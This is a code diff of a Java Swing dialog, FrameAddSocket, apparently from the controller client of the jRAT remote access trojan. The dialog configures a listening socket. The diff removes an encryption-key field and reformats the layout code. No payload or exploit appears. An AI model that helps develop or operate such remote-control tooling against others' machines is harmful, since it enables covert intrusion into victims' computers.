@@ -1,6 +1,5 @@
 package su.jrat.client.ui.frames;
 
-import java.awt.Color;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
@@ -21,20 +20,16 @@ import javax.swing.border.EmptyBorder;
 
 import su.jrat.client.ErrorDialog;
 import su.jrat.client.net.PortListener;
-import su.jrat.client.ui.components.EncryptionKeyJTextField;
 import su.jrat.client.utils.Utils;
-
 
 @SuppressWarnings("serial")
 public class FrameAddSocket extends BaseFrame {
 
 	private JPanel contentPane;
 	private JTextField txtPass;
-	private JTextField txtKey;
 	private JSpinner sTimeout;
 	private JSpinner sPort;
 	private JTextField txtName;
-	private JLabel lblLength;
 
 	public FrameAddSocket() {
 		super();
@@ -64,23 +59,6 @@ public class FrameAddSocket extends BaseFrame {
 		txtPass = new JTextField();
 		txtPass.setColumns(10);
 
-		JLabel lblKey = new JLabel("Key:");
-
-		txtKey = new EncryptionKeyJTextField() {
-			@Override
-			public void onUpdate(boolean correct) {
-				lblLength.setText(txtKey.getText().length() + "");
-
-				if (correct) {
-					lblLength.setForeground(Color.green);
-				} else {
-					lblLength.setForeground(Color.red);
-				}
-			}
-		};
-		txtKey.setBackground(Color.RED);
-		txtKey.setColumns(10);
-
 		JButton btnListen = new JButton("Listen");
 		btnListen.setIcon(new ImageIcon(FrameAddSocket.class.getResource("/icons/socket_add.png")));
 		btnListen.addActionListener(new ActionListener() {
@@ -93,12 +71,58 @@ public class FrameAddSocket extends BaseFrame {
 
 		txtName = new JTextField("Socket" + (new Random().nextInt(10000)));
 		txtName.setColumns(10);
-
-		lblLength = new JLabel("0");
-		lblLength.setForeground(Color.RED);
 		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addContainerGap().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addComponent(lblName).addComponent(lblKey).addComponent(lblTimeout).addComponent(lblPass).addComponent(lblPort)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(txtName, 217, 217, Short.MAX_VALUE).addComponent(sPort, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE).addGroup(gl_contentPane.createSequentialGroup().addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblSeconds)).addComponent(txtPass, GroupLayout.DEFAULT_SIZE, 217, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addComponent(txtKey, GroupLayout.PREFERRED_SIZE, 170, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(lblLength)))).addComponent(btnListen, Alignment.TRAILING)).addContainerGap()));
-		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(8).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(lblName).addComponent(txtName, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(sPort, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblPort)).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGap(11).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(lblTimeout).addComponent(lblSeconds))).addGroup(gl_contentPane.createSequentialGroup().addPreferredGap(ComponentPlacement.RELATED).addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblPass)).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(lblKey).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtKey, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(lblLength))).addPreferredGap(ComponentPlacement.RELATED, 11, Short.MAX_VALUE).addComponent(btnListen).addContainerGap()));
+		gl_contentPane.setHorizontalGroup(
+			gl_contentPane.createParallelGroup(Alignment.TRAILING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addContainerGap()
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
+								.addComponent(lblName)
+								.addComponent(lblTimeout)
+								.addComponent(lblPass)
+								.addComponent(lblPort))
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+								.addComponent(txtName, 217, 217, Short.MAX_VALUE)
+								.addComponent(sPort, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE)
+								.addGroup(gl_contentPane.createSequentialGroup()
+									.addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, 57, GroupLayout.PREFERRED_SIZE)
+									.addPreferredGap(ComponentPlacement.RELATED)
+									.addComponent(lblSeconds))
+								.addComponent(txtPass, GroupLayout.DEFAULT_SIZE, 217, Short.MAX_VALUE)))
+						.addComponent(btnListen, Alignment.TRAILING))
+					.addContainerGap())
+		);
+		gl_contentPane.setVerticalGroup(
+			gl_contentPane.createParallelGroup(Alignment.LEADING)
+				.addGroup(gl_contentPane.createSequentialGroup()
+					.addGap(8)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(lblName)
+						.addComponent(txtName, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(sPort, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+						.addComponent(lblPort))
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addGap(11)
+							.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+								.addComponent(lblTimeout)
+								.addComponent(lblSeconds)))
+						.addGroup(gl_contentPane.createSequentialGroup()
+							.addPreferredGap(ComponentPlacement.RELATED)
+							.addComponent(sTimeout, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)))
+					.addPreferredGap(ComponentPlacement.RELATED)
+					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
+						.addComponent(txtPass, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
+						.addComponent(lblPass))
+					.addPreferredGap(ComponentPlacement.RELATED, 36, Short.MAX_VALUE)
+					.addComponent(btnListen)
+					.addContainerGap())
+		);
 		contentPane.setLayout(gl_contentPane);
 		Utils.center(this);
 	}
